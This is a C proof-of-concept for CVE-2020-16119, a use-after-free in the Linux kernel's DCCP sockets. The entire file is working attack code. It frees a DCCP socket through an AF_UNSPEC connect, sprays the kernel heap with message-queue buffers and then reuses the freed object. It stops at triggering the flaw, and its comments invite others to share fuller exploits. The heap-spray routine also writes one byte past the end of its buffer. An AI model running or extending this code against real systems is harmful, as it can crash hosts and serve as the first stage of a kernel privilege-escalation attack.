/*
CVE-2020-16119
POC by @ManorHadar
(Feel free to share your exploits for this CVE with me!)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/shm.h>

int fd1, fd2;
struct sockaddr_in6 sk1, sk2;
#define BUFF_SIZE 64

void heap_spray();

int trigger_uaf()
{
    struct sockaddr_in6 csk1, csk2;
    struct sockaddr_in6 csk3;
    struct sockaddr_in6 csk4;

    fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
    printf("socket create fd1\n");
    memset(&sk1, 0, sizeof(sk1));
    sk1.sin6_family = AF_INET6;
    sk1.sin6_addr = in6addr_loopback;
    sk1.sin6_port = 0x214e;
    bind(fd1, (struct sockaddr *)&sk1, sizeof(sk1));
    printf("bind fd1 with sk1\n");

    listen(fd1, 0x1); // DCCP_LISTEN
    printf("listen fd1\n");

    fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
    printf("socket create f2\n");

    memset(&csk1, 0, sizeof(csk1));
    csk1.sin6_family = AF_INET6;
    csk1.sin6_addr = in6addr_loopback;
    csk1.sin6_port = 0x214e;
    csk1.sin6_flowinfo = 0;
    connect(fd2, (struct sockaddr *)&csk1, sizeof(csk1));
    printf("connect fd2 csk1\n");

    memset(&csk2, 0, sizeof(csk2));
    // calling connect with AF_UNSPEC (free)
    connect(fd1, (struct sockaddr *)&csk2, sizeof(csk2));
    printf("connect fd1 csk2\n");
    memset(&sk2, 0, sizeof(sk2));

    heap_spray();

    sk2.sin6_family = AF_INET6;
    sk2.sin6_addr = in6addr_loopback;
    sk2.sin6_port = htons(0x2000);
    sk2.sin6_flowinfo = 0x2;
    sk2.sin6_scope_id = 6;
    bind(fd2, (struct sockaddr *)&sk2, sizeof(sk2));
    printf("bind fd2 sk2\n");

    memset(&csk3, 0, sizeof(csk3));
    connect(fd2, (struct sockaddr *)&csk3, sizeof(csk3));
    printf("connect fd2 csk3\n");

    listen(fd2, 0xb1);
    printf("listen fd2\n");

    memset(&csk4, 0, sizeof(csk4));
    csk4.sin6_family = AF_INET6;
    csk4.sin6_port = htons(0x2000);
    memset(&csk4.sin6_addr, 0, sizeof(struct in6_addr));
    csk4.sin6_flowinfo = 1;
    csk4.sin6_scope_id = 0x32f1;
    connect(fd1, (struct sockaddr *)&csk4, sizeof(csk4));
    printf("connect fd1 csk4\n");
    socket(AF_INET, SOCK_STREAM, 0);
    printf("new socket\n");
    close(fd2);
    printf("close fd2\n");
    return fd2;
}

void heap_spray()
{
    printf("Spraying the Heap\n");
    struct
    {
        long mtype;
        char mtext[BUFF_SIZE];
    } msg;
    memset(msg.mtext, 0x41, BUFF_SIZE - 1);
    msg.mtext[BUFF_SIZE] = 0;
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    msg.mtype = 1; // mtype must be > 0
    for (int i = 0; i < 240; i++) {
        msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
    }
}

int main(void)
{
    printf("Triggering the Use-After-Free\n");
    trigger_uaf();
    return 0;
}